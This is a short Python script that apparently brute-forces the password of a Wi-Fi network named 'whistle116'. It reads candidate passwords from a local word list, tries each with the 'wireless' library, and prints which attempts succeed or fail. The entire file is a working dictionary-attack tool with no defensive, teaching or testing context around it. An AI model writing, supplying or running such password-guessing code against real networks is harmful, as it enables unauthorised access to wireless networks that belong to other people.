from wireless import Wireless

wire = Wireless()
with open('passwordlist.txt', 'r') as file:
    for line in file.readlines():
        if wire.connect(ssid='whistle116', password=line.strip()) == True:
            print('[+] ' + line.strip() + 'success!')
        else:
            print('[-] ' + line.strip() + ' - failed')
